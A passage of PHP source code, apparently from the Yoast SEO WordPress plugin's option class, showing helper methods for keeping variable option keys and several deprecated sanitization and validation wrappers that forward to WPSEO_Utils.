	/**
	 * Make sure that any set option values relating to post_types and/or taxonomies are retained,
	 * even when that post_type or taxonomy may not yet have been registered.
	 *
	 * @internal The wpseo_titles concrete class overrules this method. Make sure that any changes
	 * applied here, also get ported to that version.
	 *
	 * @param  array $dirty Original option as retrieved from the database.
	 * @param  array $clean Filtered option where any options which shouldn't be in our option
	 *                      have already been removed and any options which weren't set
	 *                      have been set to their defaults.
	 *
	 * @return  array
	 */
	protected function retain_variable_keys( $dirty, $clean ) {
		if ( ( is_array( $this->variable_array_key_patterns ) && $this->variable_array_key_patterns !== array() ) && ( is_array( $dirty ) && $dirty !== array() ) ) {
			foreach ( $dirty as $key => $value ) {

				// Do nothing if already in filtered options.
				if ( isset( $clean[ $key ] ) ) {
					continue;
				}

				foreach ( $this->variable_array_key_patterns as $pattern ) {

					if ( strpos( $key, $pattern ) === 0 ) {
						$clean[ $key ] = $value;
						break;
					}
				}
			}
		}

		return $clean;
	}


	/**
	 * Check whether a given array key conforms to one of the variable array key patterns for this option
	 *
	 * @usedby validate_option() methods for options with variable array keys
	 *
	 * @param  string $key Array key to check.
	 *
	 * @return string      Pattern if it conforms, original array key if it doesn't or if the option
	 *              does not have variable array keys
	 */
	protected function get_switch_key( $key ) {
		if ( ! isset( $this->variable_array_key_patterns ) || ( ! is_array( $this->variable_array_key_patterns ) || $this->variable_array_key_patterns === array() ) ) {
			return $key;
		}

		foreach ( $this->variable_array_key_patterns as $pattern ) {
			if ( strpos( $key, $pattern ) === 0 ) {
				return $pattern;
			}
		}

		return $key;
	}


	/* *********** DEPRECATED METHODS *********** */

	/**
	 * Emulate the WP native sanitize_text_field function in a %%variable%% safe way
	 *
	 * @see        https://core.trac.wordpress.org/browser/trunk/src/wp-includes/formatting.php for the original
	 *
	 * @deprecated 1.5.6.1
	 * @deprecated use WPSEO_Utils::sanitize_text_field()
	 * @see        WPSEO_Utils::sanitize_text_field()
	 *
	 * @param string $value String value to sanitize.
	 *
	 * @return string
	 */
	public static function sanitize_text_field( $value ) {
		_deprecated_function( __FUNCTION__, 'WPSEO 1.5.6.1', 'WPSEO_Utils::sanitize_text_field()' );

		return WPSEO_Utils::sanitize_text_field( $value );
	}


	/**
	 * Sanitize a url for saving to the database
	 * Not to be confused with the old native WP function
	 *
	 * @deprecated 1.5.6.1
	 * @deprecated use WPSEO_Utils::sanitize_url()
	 * @see        WPSEO_Utils::sanitize_url()
	 *
	 * @param  string $value             URL string to sanitize.
	 * @param  array  $allowed_protocols Set of allowed protocols.
	 *
	 * @return  string
	 */
	public static function sanitize_url( $value, $allowed_protocols = array( 'http', 'https' ) ) {
		_deprecated_function( __FUNCTION__, 'WPSEO 1.5.6.1', 'WPSEO_Utils::sanitize_url()' );

		return WPSEO_Utils::sanitize_url( $value, $allowed_protocols );
	}

	/**
	 * Validate a value as boolean
	 *
	 * @deprecated 1.5.6.1
	 * @deprecated use WPSEO_Utils::validate_bool()
	 * @see        WPSEO_Utils::validate_bool()
	 *
	 * @static
	 *
	 * @param mixed $value Value to validate.
	 *
	 * @return  bool
	 */
	public static function validate_bool( $value ) {
		_deprecated_function( __FUNCTION__, 'WPSEO 1.5.6.1', 'WPSEO_Utils::validate_bool()' );

		return WPSEO_Utils::validate_bool( $value );
	}

	/**
	 * Cast a value to bool
	 *
	 * @deprecated 1.5.6.1
	 * @deprecated use WPSEO_Utils::emulate_filter_bool()
	 * @see        WPSEO_Utils::emulate_filter_bool()
	 *
	 * @static
	 *
	 * @param    mixed $value Value to cast.
	 *
	 * @return    bool
	 */
	public static function emulate_filter_bool( $value ) {
		_deprecated_function( __FUNCTION__, 'WPSEO 1.5.6.1', 'WPSEO_Utils::emulate_filter_bool()' );

		return WPSEO_Utils::emulate_filter_bool( $value );
	}


	/**
	 * Validate a value as integer
	 *
	 * @deprecated 1.5.6.1
	 * @deprecated use WPSEO_Utils::validate_int()
	 * @see        WPSEO_Utils::validate_int()
	 *
	 * @param mixed $value Value to validate.
	 *
	 * @return  mixed  int or false in case of failure to convert to int
	 */
	public static function validate_int( $value ) {
		_deprecated_function( __FUNCTION__, 'WPSEO 1.5.6.1', 'WPSEO_Utils::validate_int()' );

		return WPSEO_Utils::validate_int( $value );
	}

	/**
	 * Cast a value to integer
	 *
	 * @deprecated 1.5.6.1
	 * @deprecated use WPSEO_Utils::emulate_filter_int()
	 * @see        WPSEO_Utils::emulate_filter_int()
	 *
	 * @static
	 *
	 * @param    mixed $value Value to cast.
	 *
	 * @return    int|bool
	 */
	public static function emulate_filter_int( $value ) {
		_deprecated_function( __FUNCTION__, 'WPSEO 1.5.6.1', 'WPSEO_Utils::emulate_filter_int()' );

		return WPSEO_Utils::emulate_filter_int( $value );
	}


	/**
	 * Recursively trim whitespace round a string value or of string values within an array
	 * Only trims strings to avoid typecasting a variable (to string)
	 *
	 * @deprecated 1.5.6.1
	 * @deprecated use WPSEO_Utils::trim_recursive()
	 * @see        WPSEO_Utils::trim_recursive()
	 *
	 * @static
	 *
	 * @param   mixed $value Value to trim or array of values to trim.
	 *
	 * @return  mixed      Trimmed value or array of trimmed values
	 */
	public static function trim_recursive( $value ) {
		_deprecated_function( __FUNCTION__, 'WPSEO 1.5.6.1', 'WPSEO_Utils::trim_recursive()' );

		return WPSEO_Utils::trim_recursive( $value );
	}
}
